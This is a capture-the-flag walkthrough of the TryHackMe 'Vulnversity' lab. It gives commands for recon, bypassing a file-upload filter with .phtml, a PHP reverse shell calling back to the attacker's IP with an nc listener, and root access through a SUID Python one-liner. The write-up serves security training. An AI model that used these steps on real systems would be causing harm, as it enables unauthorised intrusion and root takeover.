# Vulnversity — TryHackMe Walkthrough

A complete walkthrough of the Vulnversity room on TryHackMe. Covers reconnaissance, web exploitation, reverse shell, privilege escalation, and flag capture.

---

## 1. Reconnaissance

### 1.1 Nmap Scan (Verbose Mode Flag)
Run an initial Nmap scan with verbose mode:

nmap -sC -sV -v 10.10.X.X

Verbose mode prints extra information including the first flag. Scroll through the output and locate the THM{...} flag.

### 1.2 Full Port Scan
Identify all open ports:

nmap -p- 10.10.X.X

Then scan the discovered ports:

nmap -sC -sV -p <ports> 10.10.X.X

---

## 2. Web Enumeration

### 2.1 Directory Brute Forcing
Use Gobuster to find hidden directories:

gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirb/common.txt

Important directories:
- /uploads
- /internal
- /assets

### 2.2 File Upload Page
The upload form blocks .php files but allows alternative extensions such as .phtml.

---

## 3. Exploitation

### 3.1 Preparing a Reverse Shell
Edit your PHP reverse shell:

$ip = 'YOUR_TUN0_IP';
$port = 4444;

Save the file as:

shell.phtml

### 3.2 Uploading the Payload
Upload shell.phtml through the web form.

Access it:

http://10.10.X.X/uploads/shell.phtml

### 3.3 Catching the Reverse Shell
Start a listener:

nc -lvnp 4444

Once the file is executed, you receive a shell as www-data.

---

## 4. Privilege Escalation

### 4.1 Enumerating SUID Binaries
Search for SUID binaries:

find / -perm -u=s -type f 2>/dev/null

Look for unusual binaries that can be exploited.

### 4.2 GTFOBins Exploit
If Python is SUID:

python -c 'import os; os.setuid(0); os.system("/bin/bash")'

You now have a root shell.

---

## 5. Flags

### 5.1 User Flag
cat /home/<username>/user.txt

### 5.2 Root Flag
cat /root/root.txt

---

## 6. Summary

- Performed Nmap enumeration with verbose mode
- Found upload vulnerability
- Bypassed file filter using .phtml
- Gained reverse shell
- Enumerated SUID binaries
- Escalated to root using GTFOBins
- Retrieved both flags

